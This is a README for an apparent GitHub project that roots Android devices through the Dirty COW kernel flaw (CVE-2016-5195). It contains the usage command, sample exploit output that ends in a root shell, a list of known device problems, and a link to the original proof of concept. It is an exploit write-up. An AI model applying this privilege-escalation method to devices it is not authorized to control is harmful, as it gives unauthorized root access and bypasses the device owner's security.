# DirtyCowAndroid
Repo For Working on Dirty Cow Based Android Root Method    
Currently Linux Only    
Youtube: https://www.youtube.com/watch?v=bzrRWfDOQcM  
    
Should Spawn a root shell on device  
Usage sudo make root  
Output:  
[*] mmap 0xb6f00000  
[*] exploit (patch)  
[*] currently 0xb6f00000=464c457f  
[*] madvise = 0xb6f00000 13708  
[*] madvise = 0 1048576  
[*] /proc/self/mem 0 1048576  
[*] exploited 0xb6f00000=464c457f  
adb shell /system/bin/run-as  
running as uid 2000  
uid 0  
root@ZTE-V811:/ #
  
##Bugs / Problems  
1)  
  System Will Hang If You Exec a command on spawned shell Temp Fix: Exit Back to Terminal and type  
  "adb shell"  
  "run-as"  
  Going "adb shell run-as" will produce the hang  
2) 
  Android 5 (Samsung Galaxy S4)  
  setresgid/setresuid failed  
  
3) 
    Incompatible with devices with system partitions made read-only by the _hardware_, such as the DigiLand DL718M and other supercheap       devices. 
Oringal PoC Code: https://github.com/timwr/CVE-2016-5195
